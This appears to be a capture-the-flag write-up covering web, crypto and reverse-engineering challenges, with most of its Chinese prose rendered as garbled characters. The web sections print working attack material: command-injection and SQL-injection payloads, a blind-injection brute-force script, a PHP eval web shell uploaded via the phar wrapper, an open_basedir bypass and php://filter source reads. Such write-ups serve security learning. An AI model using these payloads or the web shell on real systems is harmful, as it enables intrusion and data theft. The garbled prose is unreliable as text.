# web
## web1
- �޸�ǰ�˸ı�Ԫ�����ԣ�flag��ť�õ�Դ��

- `assert("file_exists('$page')");`�պϽ�������ִ��

- payload:

  ```
  file=test'.system('cat ./.ffll44gg').'
  ```

## web2

ɨ�跢��`show.php`

�ϴ�һ��ͼƬ����url��Ϊ`f=show&imageid=xxx`���²�f�����ǰ������ļ����������Զ���`.php`��׺

�����������pharαЭ���ƹ��Զ�����php��׺������

�½�һ��`shell.php`����Ϊ`<?php eval($_POST[cmd]); ?>`��ѹ��Ϊzip�ļ���Ȼ���޸�Ϊpng��׺�ϴ�,�õ��ϴ���·������pharαЭ�����

![Vo4LND.png](https://s2.ax1x.com/2019/06/15/Vo4LND.png)

## web3

�򵥵�äע 

������`�ո�`,`,`,`for`,`and`,`%0d`,`%0a`���ַ� �������ź�from�ƹ�����

exp:
```
# -*- coding: utf-8 -*-
import requests
url = 'http://192.168.138.12:8002/'
def check(payload):
    postdata = {'username':payload,'password':'xx'}
    r = requests.post(url, postdata).content
    return 'Username Wrong' in r

password  = ''
s = r'0123456789abcdef'

for i in xrange(32,0,-1):
    for c in s:
        payload = '\'or(mid((select(password)from(admin))from(%d))<>\'%s\')#' % (i, (c+password))
        if check(payload):
            password = c + password
            break
    print password
```

## web4
���ֽ�ע��

payload:
```
?id=0%df%27union%20select%20flag,2,3%20from%20flag%23
```

## web5

��Ŀ����`open_basedir`Ϊ`/var/www/html`����flag�ڸ�Ŀ¼�У�ͬʱ����������������ִ������ĺ���

`open_basedir`�ƹ�payload��
```
chdir('image');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('flag'));
```

## web6

base64���Բ��ڱ��뷶Χ�ڵ��ַ�,phpαЭ���Դ��õ�flag

payload:
```
*c*G*h*w*O*i*8*v*Z*m*l*s*d*G*V*y*L*3*J*l*Y*W*Q*9*Y*2*9*u*d*m*V*y*d*C*5*i*Y*X*N*l*N*j*Q*t*Z*W*5*j*b*2*R*l*L*3*J*l*c*2*9*1*c*m*N*l*P*W*Z*s*Y*W*c*u*c*G*h*w*
```

## web7

`string sprintf( string $format[, mixed $args[, mixed $...]] )`

Returns a string produced according to the formatting string format. 


payload��
```
?myname=%s
```

## web8

- ���ƣ��ռ���Ϣ�õ�Ŀ¼
- ![Vo52rt.png](https://s2.ax1x.com/2019/06/15/Vo52rt.png)
  - ����add.php�ϴ�����ҳ�淴Ӧ�²�ֻ��ǰ��ֻ���Ի����á�
- �ļ��������õ�Դ��
  - ��`test.php`��ʾ`put file parameter`�²����ļ�����©��
  - POST����`file=php://filter/read=convert.base64-encode/resource=add.php`�ȵȵõ�����base64������Դ��,base64����õ�Դ��
- ���Դ�룬�鿴sql���ˡ��ϴ����˷�ʽ
  - sql����Ϊ����`'`����Ϊ�ո񣬲��ñպϡ����ǿ���ʹ��һ��`��`�͵�����`'`���պ�ע��ʹ��sql���Ϊ������`'`��������ַ�����������Ϊһ������sql��������ķ��ż���
    - `select * from skctf2019_admin where  password='\' and username=' or 1=1;#'`
    - ![Vo5y2d.png](https://s2.ax1x.com/2019/06/15/Vo5y2d.png)
  - upload����Ϊ��
    - ��������⣬ȥ����׺��˫д�����ƹ������кܶ����ƹ���ʽ��
- ע����½
- �ϴ��õ�shell
- �Ͻ����ӣ��ҵ�flag

# crypto
## rsa
��֪n��e��d,��p��q

```
#!/usr/bin/env python2
# coding: utf-8
# ��֪ d���� p��q

import random
from md5 import md5

def gcd(a, b):
    if a < b:
        a, b = b, a
    while b != 0:
        temp = a % b
        a = b
        b = temp
    return a


def getpq(n, e, d):
    p = 1
    q = 1
    while p == 1 and q == 1:
        k = d * e - 1
        g = random.randint(0, n)
        while p == 1 and q == 1 and k % 2 == 0:
            k /= 2
            y = pow(g, k, n)
            if y != 1 and gcd(y-1, n) > 1:
                p = gcd(y-1, n)
                q = n/p
    return p, q



n = 16352578963372306131642407541567045533766691177138375676491913897592458965544068296813122740126583082006556217616296009516413202833698268845634497478988128850373221853516973259086845725813424850548682503827191121548693288763243619033224322698075987667531863213468223654181658012754897588147027437229269098246969811226129883327598021859724836993626315476699384610680857047403431430525708390695622848315322636785398223207468754197643541958599210127261345770914514670199047435085714403641469016212958361993969304545214061560160267760786482163373784437641808292654489343487613446165542988382687729593384887516272690654309  
e = 65537
d = 9459928379973667430138068528059438139092368625339079253289560577985304435062213121398231875832264894458314629575455553485752685643743266654630829957442008775259776311585654014858165341757547284112061885158006881475740553532826576260839430343960738520822367975528644329172668877696208741007648370045520535298040161675407779239300466681615493892692265542290255408673533853011662134953869432632554008235340864803377610352438146264524770710345273439724107080190182918285547426166561803716644089414078389475072103315432638197578186106576626728869020366214077455194554930725576023274922741115941214789600089166754476449453

p, q = getpq(n, e, d)
assert(p*q == n)
print p, q

print "Flag: SKCTF{%s}" %md5(str(p + q)).hexdigest()
```

## xor

�򵥵���򣬱���key
```
from base64 import b64decode
file=open("xor.txt","r").read()
# rJeekZuQkZjfqpGWiZqNjJaLht+Qmd+snJaakZya356Rm9+rmpyXkZCTkJiG9b6bm42ajIzFysjG366WnpGInpGYnpGY362QnpvT37eKnpGYm56Q37uWjIuNlpyL09+ulpGYm56Q09+sl56Rm5CRmN+vjZCJlpGcmtPfzcnJysbP09+v0a3RvJeWkZ71rLS8q7mEzpvJnsnLm8rGzc/Nyp7LzcbNmp2Zy5mZxpyZxsvOzsuC

ciphertext = b64decode(file)

for key in range(256):
    plaintext=''
    for i in ciphertext:
        plaintext+=chr(key^ord(i))
    if "SKCTF{" in plaintext:
        print plaintext

# Shandong University of Science and Technology
# Address:579 Qianwangang Road, Huangdao District, Qingdao, Shandong Province, 266590, P.R.China
# SKCTF{1d6a64d592025a4292ebf4ff9cf94114}
```

## ץ��̰�۷�
Affine����
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : Dxx

#flag{QIBAIBASHIYIWANTOMYCARD}
#��Կ��a=25 b=14 (mod 26)

import gmpy2

#��֪������ͬ�ַ�����ǰ�����ĸ���ɵó�Affine�������Կa��b
#E(B)=a*B+b (mod 26) = N
#E(I)=a*I+b (mod 26) = G

#��13=1*a+b (mod 26)
#�� 6=8*a+b (mod 26)
#��ʽ������������Կa���������������Կb
#����� -7=7*a (mod 26)
#�� a=-7*7^-1 = 19 * 7^-1
#ע��:����������ģ26�����㣨��������Ԫ��

re = gmpy2.invert(7,26)
a = (19*re) % 26
b = (13-a)%26


def decrypt(key, c):
    return ''.join([unshift([a, b], ch) for ch in c])

def unshift(key, ch):
    offset = ord(ch) - ord('A')
    return chr((((key[0] * offset) + key[1]) % 26) + ord('A'))

if __name__ == '__main__':
	c = 'YGNOGNOWHGQGSOBVACQMOXL'
	key = [a,b]
	print decrypt(key,c)
```



# re

## RE1.exe

flag��you_know_the_knapsack_problem_

**��Ŀ����**

1.�������

2.��ѧ����

3.��������

**����˼·**

ida������

main����

```
puts("please input flag:");
```

  	v5 = &v14;
  	scanf("%s", &v14);
  	for ( i = 0; *(&v14 + i); ++i )
  	{
    	if ( i > 32 )
    	  goto LABEL_12;
  	}
  	if ( i % 2 != 1 )
  	{
    	v8 = 1;
    	z(&v14, i, (int *)&_data_start__, &v15);
    	for ( j = 0; j <= 14; ++j )
    	{
    	  if ( *(&v15 + j) != flag[j] )
    	  {
    	    puts("try again");
    	    goto LABEL_12;
    	  }
    }
    puts("Congratulations!");

����flag���ж�����ĳ��Ȳ�����32����ż����z�����������룬�Ƚ�v15����֪��flag����һ����������ȷ��

��z����
	

```
int __cdecl z(char *s, int n, int *a, int *c	)
	����
for ( i = 0; i < n; i += 2 )
```

  	{
    v7 = s[i + 1];
    v12 = 1;
     SwitchtoBin((int)&v19, v7);
    v7 = s[i];
    v12 = 2;
    SwitchtoBin((int)&v20, v7);
    v12 = 3;
    std::operator+<char,std::char_traits<char>,std::allocator<char>>(
      (int)&v18,
      (std::string *)&v20,
      (std::string *)&v19);
    v12 = 4;
    std::string::~string(v6);
    v12 = 5;
    std::string::~string(v6);
    c[v23] = 0;
    for ( j = 0; (signed int)j <= 9; j = (std::string *)((char *)j + 1) )
    {
      v10 = &c[v23];
      v9 = *v10;
      v12 = 6;
      v4 = (_BYTE *)std::string::operator[](j);
      *v10 = v9 + (*v4 - 48) * a[(_DWORD)j];
    }
    ++v23;
    v12 = 1;
    std::string::~string(v6);
  	}

swichtoBin��Ҫ�Ǹ��ṹ�彫�ַ�ת����5λ�Ķ����ơ�
�����øú�����Ҫ�Ǵ��������ÿһ���ַ������ַ�ת����5λ�Ķ����ƣ�����һ�飬��ϳ�һ��10λ�Ķ����ơ�Ȼ���жϸö����Ƶ�ÿһλ�������λΪ1��c��������a�ڸ�λ�����֡����磬��ĸab 0000100010 [1,3,5,11,21,44,87,175,349,701] c����21+349=360��

c���Կ��ɱ�������ı�������������a����Կ�����Ʒ������������֪a����a�ǵ����ģ��ʿ�ֱ�ӴӴ�С�ж�c�Ƿ��a[i]����������λΪ1�������Ƴ�10λ�Ķ����������ٸ���swichtobin�Ĺ�����ת�����ַ��õ�flag��



#RE2.exe

flag��you_solved_the_knapsack_problem_

**��Ŀ����**

1.�������

2.��ѧ����

3.��������������

**����˼·**

��һ�����������������㷨��

IDA�����뿴main����

 	puts("please input flag:");
  	v5 = &v14;
  	scanf("%s", &v14);
  	for ( i = 0; *(&v14 + i); ++i )
  	{
    	if ( i > 32 )
    	  goto LABEL_15;
  	}
  	if ( i % 2 != 1 )
  	{
    	for ( j = 0; j <= 9; ++j )
    	  *(&v15 + j) = _data_start__[j] * t % ::k;
    	v8 = 1;
    	z(&v14, i, &v15, &v16);
    	for ( k = 0; k <= 15; ++k )
    	{
    	  if ( *(&v16 + k) != flag[k] )
    	  {
    	    puts("try again");
    	    goto LABEL_15;
    	  }
    	}
    	puts("Congratulations!");
  	}
����flag���ж�����ĳ��Ȳ�����32����ż������data_start�������ģ����õ�����v15��z�����������룬�Ƚ�v15����֪��flag����һ����������ȷ��

��z����

```
int __cdecl z(char *s, int n, int *b, int *c)
 for ( i = 0; i < n; i += 2 )
 {
    v7 = s[i + 1];
	v12 = 1;
	SwitchtoBin((unsigned int)&v19);
	v7 = s[i];
	v12 = 2;
	SwitchtoBin((unsigned int)&v20);
	v12 = 3;
	std::operator+<char,std::char_traits<char>,std::allocator<char>>(
	  (int)&v18,
	  (std::string *)&v20,
	  (std::string *)&v19);
	v12 = 4;
	std::string::~string(v6);
	v12 = 5;
	std::string::~string(v6);
	c[v23] = 0;
		for ( j = 0; (signed int)j <= 9; j = (std::string *)((char *)j + 1) )
	{
	  v10 = &c[v23];
	  v9 = *v10;
	  v12 = 6;
	  v4 = (_BYTE *)std::string::operator[](j);
	  *v10 = v9 + (*v4 - 48) * b[(_DWORD)j];
	}
	++v23;
	v12 = 1;
	std::string::~string(v6);
```

  	}

swichtoBin��Ҫ�Ǹ��ṹ�彫�ַ�ת����5λ�Ķ����ơ�

�����øú�����Ҫ�Ǵ��������ÿһ���ַ������ַ�ת����5λ�Ķ����ƣ�����һ�飬��ϳ�һ��10λ�Ķ����ơ�Ȼ���жϸö����Ƶ�ÿһλ�������λΪ1��c��������b�ڸ�λ�����֡�

c�൱�ڱ��������еı�����������b�൱����Ʒ������������֪������������Ʒ�Ƿ�װ�뱳���С���������b���ɵ�����aת���ɵķǵ��������飬���޷�ֱ����b�󣬿�����a�󡣵���c����b�ĺ͡�����Ҫ��cת����a�ĺ͡�����ģ��������ʣ�b[i]=a[i]*t(mod(k)),��b�ĺ�=a�ĺ�\*t(mod(k))������Ҫ����ģ�����㣬Ҳ����a�ĺ�=b�ĺ�\*t����Ԫ(mod(k))��

�õ�a�ĺͺ�������֪a����a�ǵ����ģ��ʿ�ֱ�ӴӴ�С�ж�c�Ƿ��a[i]����������λΪ1�������Ƴ�10λ�Ķ����������ٸ���swichtobin�Ĺ�����ת�����ַ��õ�flag��

## CUBE

�� IDA �򿪳����������

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  signed int i; // [rsp+14h] [rbp-13Ch]
  signed int k; // [rsp+14h] [rbp-13Ch]
  signed int m; // [rsp+14h] [rbp-13Ch]
  signed int j; // [rsp+18h] [rbp-138h]
  signed int l; // [rsp+18h] [rbp-138h]
  signed int n; // [rsp+18h] [rbp-138h]
  int v10; // [rsp+1Ch] [rbp-134h]
  double v11; // [rsp+20h] [rbp-130h]
  double v12; // [rsp+28h] [rbp-128h]
  double v13; // [rsp+30h] [rbp-120h]
  double v14; // [rsp+38h] [rbp-118h]
  double v15; // [rsp+40h] [rbp-110h]
  double v16; // [rsp+48h] [rbp-108h]
  unsigned int v17; // [rsp+50h] [rbp-100h]
  unsigned int v18; // [rsp+54h] [rbp-FCh]
  unsigned int v19; // [rsp+58h] [rbp-F8h]
  unsigned int v20; // [rsp+5Ch] [rbp-F4h]
  unsigned int v21; // [rsp+60h] [rbp-F0h]
  unsigned int v22; // [rsp+64h] [rbp-ECh]
  unsigned int v23; // [rsp+68h] [rbp-E8h]
  unsigned int v24; // [rsp+6Ch] [rbp-E4h]
  unsigned int v25; // [rsp+70h] [rbp-E0h]
  unsigned int v26; // [rsp+74h] [rbp-DCh]
  unsigned int v27; // [rsp+78h] [rbp-D8h]
  unsigned int v28; // [rsp+7Ch] [rbp-D4h]
  unsigned int v29; // [rsp+80h] [rbp-D0h]
  unsigned int v30; // [rsp+84h] [rbp-CCh]
  unsigned int v31; // [rsp+88h] [rbp-C8h]
  unsigned int v32; // [rsp+8Ch] [rbp-C4h]
  double v33; // [rsp+90h] [rbp-C0h]
  double v34; // [rsp+98h] [rbp-B8h]
  double v35; // [rsp+A0h] [rbp-B0h]
  double v36; // [rsp+A8h] [rbp-A8h]
  double v37; // [rsp+B0h] [rbp-A0h]
  double v38; // [rsp+B8h] [rbp-98h]
  double v39; // [rsp+C0h] [rbp-90h]
  double v40; // [rsp+C8h] [rbp-88h]
  double v41; // [rsp+D0h] [rbp-80h]
  double v42; // [rsp+D8h] [rbp-78h]
  double v43; // [rsp+E0h] [rbp-70h]
  double v44; // [rsp+E8h] [rbp-68h]
  double v45; // [rsp+F0h] [rbp-60h]
  double v46; // [rsp+F8h] [rbp-58h]
  double v47; // [rsp+100h] [rbp-50h]
  double v48; // [rsp+108h] [rbp-48h]
  unsigned __int64 v49; // [rsp+118h] [rbp-38h]

  v49 = __readfsqword(0x28u);
  puts("Baby math game.");
  puts("Know it, than solve it...");
  for ( i = 0; i <= 3; ++i )
  {
    for ( j = 0; j <= 3; ++j )
    {
      argv = (&v17 + 4LL * i + j);
      __isoc99_scanf("%d", argv);
    }
  }
  for ( k = 0; k <= 3; ++k )
  {
    for ( l = 0; l <= 3; ++l )
    {
      if ( (*(&v17 + 4LL * k + l) & 0x80000000) != 0 )
      {
        puts("Wrong!");
        exit(0);
      }
    }
  }
  transform(&v17, argv);
  v10 = 0;
  for ( m = 0; m <= 3; ++m )
  {
    for ( n = 0; n <= 3; ++n )
      *(&v33 + v10++) = *(&v17 + 4LL * m + n);
  }
  v11 = sqrt(v35 * v35 + v33 * v33 + v34 * v34);
  if ( v11 > 0.0001 || v11 < -0.0001 )
  {
    puts("Wrong!");
    exit(0);
  }
  if ( v35 != 0.0 || v39 != 0.0 || v43 != 0.0 || v47 != 0.0 )
  {
    puts("Wrong!");
    exit(0);
  }
  v12 = sqrt((v39 - v35) * (v39 - v35) + (v37 - v33) * (v37 - v33) + (v38 - v34) * (v38 - v34));
  v13 = sqrt((v43 - v39) * (v43 - v39) + (v41 - v37) * (v41 - v37) + (v42 - v38) * (v42 - v38));
  v14 = sqrt((v47 - v43) * (v47 - v43) + (v45 - v41) * (v45 - v41) + (v46 - v42) * (v46 - v42));
  v15 = sqrt((v47 - v35) * (v47 - v35) + (v45 - v33) * (v45 - v33) + (v46 - v34) * (v46 - v34));
  if ( v12 != v13 || v12 != v14 || v12 != v15 || v13 != v14 || v13 != v15 || v14 != v15 )
  {
    puts("Wrong!");
    exit(0);
  }
  if ( v12 - 1.0 > 0.0001 || v12 - 1.0 < -0.0001 )
  {
    puts("Wrong!");
    exit(0);
  }
  if ( v36 != v40 || v36 != v44 || v48 != v36 || v40 != v44 || v40 != v48 || v44 != v48 )
  {
    puts("Wrong!");
    exit(0);
  }
  v16 = sqrt(v40 * v40 + v13 * v13);
  if ( v16 - 6.082762 > 0.0001 || v16 - 6.082762 < -0.0001 )
  {
    puts("Wrong!");
    exit(0);
  }
  printf(
    "Congrats! You flag is: skctf{%d%d%d%d-%d%d%d%d%d%d%d%d-%d%d%d%d}\n",
    v17,
    v18,
    v19,
    v20,
    v21,
    v22,
    v23,
    v24,
    v25,
    v26,
    v27,
    v28,
    v29,
    v30,
    v31,
    v32);
  return 0;
}
```

��������Ĵ���ǳ����������漰̫��������ɣ�������Ҫ������Ƿ����㷨��

������Ҫ���� 4 * 4 = 16 ����������(���� 0 )��������Щ���ݱ�����һ�������У����������߼��������뵽����һ�������� IDA �ж���ر���������/���͸ı�֮���������

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  signed int i; // [rsp+14h] [rbp-13Ch]
  signed int k; // [rsp+14h] [rbp-13Ch]
  signed int m; // [rsp+14h] [rbp-13Ch]
  signed int j; // [rsp+18h] [rbp-138h]
  signed int l; // [rsp+18h] [rbp-138h]
  signed int n; // [rsp+18h] [rbp-138h]
  int v10; // [rsp+1Ch] [rbp-134h]
  double v11; // [rsp+20h] [rbp-130h]
  double v12; // [rsp+28h] [rbp-128h]
  double v13; // [rsp+30h] [rbp-120h]
  double v14; // [rsp+38h] [rbp-118h]
  double v15; // [rsp+40h] [rbp-110h]
  double v16; // [rsp+48h] [rbp-108h]
  unsigned int v17[4][4]; // [rsp+50h] [rbp-100h]
  double v18[16]; // [rsp+90h] [rbp-C0h]
  unsigned __int64 v19; // [rsp+118h] [rbp-38h]

  v19 = __readfsqword(0x28u);
  puts("Baby math game.");
  puts("Know it, than solve it...");
  for ( i = 0; i <= 3; ++i )
  {
    for ( j = 0; j <= 3; ++j )
    {
      argv = (v17 + 4 * (4LL * i + j));
      __isoc99_scanf("%d", argv);
    }
  }
  for ( k = 0; k <= 3; ++k )
  {
    for ( l = 0; l <= 3; ++l )
    {
      if ( (v17[0][4LL * k + l] & 0x80000000) != 0 )
      {
        puts("Wrong!");
        exit(0);
      }
    }
  }
  transform(v17, argv);
  v10 = 0;
  for ( m = 0; m <= 3; ++m )
  {
    for ( n = 0; n <= 3; ++n )
      v18[v10++] = v17[0][4LL * m + n];
  }
  v11 = sqrt(v18[2] * v18[2] + v18[0] * v18[0] + v18[1] * v18[1]);
  if ( v11 > 0.0001 || v11 < -0.0001 )
  {
    puts("Wrong!");
    exit(0);
  }
  if ( v18[2] != 0.0 || v18[6] != 0.0 || v18[10] != 0.0 || v18[14] != 0.0 )
  {
    puts("Wrong!");
    exit(0);
  }
  v12 = sqrt(
          (v18[6] - v18[2]) * (v18[6] - v18[2])
        + (v18[4] - v18[0]) * (v18[4] - v18[0])
        + (v18[5] - v18[1]) * (v18[5] - v18[1]));
  v13 = sqrt(
          (v18[10] - v18[6]) * (v18[10] - v18[6])
        + (v18[8] - v18[4]) * (v18[8] - v18[4])
        + (v18[9] - v18[5]) * (v18[9] - v18[5]));
  v14 = sqrt(
          (v18[14] - v18[10]) * (v18[14] - v18[10])
        + (v18[12] - v18[8]) * (v18[12] - v18[8])
        + (v18[13] - v18[9]) * (v18[13] - v18[9]));
  v15 = sqrt(
          (v18[14] - v18[2]) * (v18[14] - v18[2])
        + (v18[12] - v18[0]) * (v18[12] - v18[0])
        + (v18[13] - v18[1]) * (v18[13] - v18[1]));
  if ( v12 != v13 || v12 != v14 || v12 != v15 || v13 != v14 || v13 != v15 || v14 != v15 )
  {
    puts("Wrong!");
    exit(0);
  }
  if ( v12 - 1.0 > 0.0001 || v12 - 1.0 < -0.0001 )
  {
    puts("Wrong!");
    exit(0);
  }
  if ( v18[3] != v18[7]
    || v18[3] != v18[11]
    || v18[15] != v18[3]
    || v18[7] != v18[11]
    || v18[7] != v18[15]
    || v18[11] != v18[15] )
  {
    puts("Wrong!");
    exit(0);
  }
  v16 = sqrt(v18[7] * v18[7] + v13 * v13);
  if ( v16 - 6.082762 > 0.0001 || v16 - 6.082762 < -0.0001 )
  {
    puts("Wrong!");
    exit(0);
  }
  printf(
    "Congrats! You flag is: skctf{%d%d%d%d-%d%d%d%d%d%d%d%d-%d%d%d%d}\n",
    v17[0][0],
    v17[0][1],
    v17[0][2],
    v17[0][3],
    v17[1][0],
    v17[1][1],
    v17[1][2],
    v17[1][3],
    v17[2][0],
    v17[2][1],
    v17[2][2],
    v17[2][3],
    v17[3][0],
    v17[3][1],
    v17[3][2],
    v17[3][3]);
  return 0;
}
```

Ȼ���� transform ����

```c
unsigned __int64 __fastcall transform(__int64 a1)
{
  signed int i; // [rsp+18h] [rbp-58h]
  signed int k; // [rsp+18h] [rbp-58h]
  signed int j; // [rsp+1Ch] [rbp-54h]
  signed int l; // [rsp+1Ch] [rbp-54h]
  int v6[4][4]; // [rsp+20h] [rbp-50h]
  unsigned __int64 v7; // [rsp+68h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  for ( i = 0; i <= 3; ++i )
  {
    for ( j = 0; j <= 3; ++j )
      v6[0][4LL * j + i] = *(a1 + 16LL * i + 4LL * j);
  }
  for ( k = 0; k <= 3; ++k )
  {
    for ( l = 0; l <= 3; ++l )
      *(16LL * k + a1 + 4LL * l) = v6[0][4LL * k + l];
  }
  return __readfsqword(0x28u) ^ v7;
}
```

��Ϻ������ֺʹ���(���ߵ���)���Ʋ���������Դ���ľ�������һ��ת������(���н���)��

��һ���߼��������е�����ȡ����������һ��һά������(v18)��Ȼ��ʹ�������е�ǰ����Ԫ������һ�����㣬���Խ����ܽ�Ϊ v9 = ��a^2 + b^2 + c^2�����Ǽ���ռ�ֱ������ϵ�㵽ԭ��֮�����Ĺ�ʽ���²� 4 * 4 ������ÿ 4 ��Ԫ��һ�飬ǰ������ɿռ�ֱ������ϵ�е�һ���㣬���Ż������ĳ��Ƚ��м�飬Ҫ���һ����λ��ԭ�㡣��������������������Ϊ��

```c
  if ( v16[2] != 0.0 || v16[6] != 0.0 || v16[10] != 0.0 || v16[14] != 0.0 )
  {
    puts("Wrong!");
    exit(0);
  }
```

Ȼ��ֱ������һ�������������ġ�һ�� ����֮��ľ��룬Ҫ��������ȡ���Ȼ����������ĸ�����Ҫ���һ��ԭ��λ�� O ��������Ρ�����Ĵ��뻹Ҫ������ľ���Ϊ 1.

```c
  if ( v10 - 1.0 > 0.0001 || v10 - 1.0 < -0.0001 )
  {
    puts("Wrong!");
    exit(0);
  }
```

��������ʼ����ÿ������һ��Ԫ�أ�����Ҫ���������

```c
  if ( v16[3] != v16[7]
    || v16[3] != v16[11]
    || v16[15] != v16[3]
    || v16[7] != v16[11]
    || v16[7] != v16[15]
    || v16[11] != v16[15] )
  {
    puts("Wrong!");
    exit(0);
  }
```

�������õڶ������Ԫ���� v14 = sqrt(v16[7] * v16[7] + v11 * v11);  ���㣬Ҫ�������� 6.082762��

ʵ���������������λ�ڿռ�ֱ������ϵ��һ�������壬����ʵ�ֵļ��������ǳ������Ҳ���Խ��ߵĳ���Ҫ���� 6.082762�����ڵ��泤��֮ǰ�Ѿ�ȷ��Ϊ 1����ô����߶ȵ�ƽ�� = 6.082762 * 6.082762 - 1 * 1 = 35.999 Լ���� 36���������� 6.

��������߼��ܽ����������ǵ�������� 0 1 1 0 0 0 1 1 0 0 0 0 6 6 6 6������ת�ú�ľ���Ϊ

```
0 0 0 6
1 0 0 6
1 1 0 6
0 1 0 6
```

�ĸ��������ֱ��� (0, 0, 0), (1, 0, 0), (1, 1, 0), (0, 1, 0)���߶�Ϊ 6��

flag: skctf{0006-10061106-0106}